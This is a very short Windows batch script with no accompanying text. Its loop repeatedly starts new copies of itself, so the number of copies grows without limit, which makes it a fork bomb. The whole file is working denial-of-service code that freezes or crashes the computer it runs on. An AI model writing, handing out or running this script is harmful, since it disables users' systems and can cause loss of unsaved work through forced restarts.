@echo off
chcp 65001> nul
:loop
start "" "%~f0"
goto loop
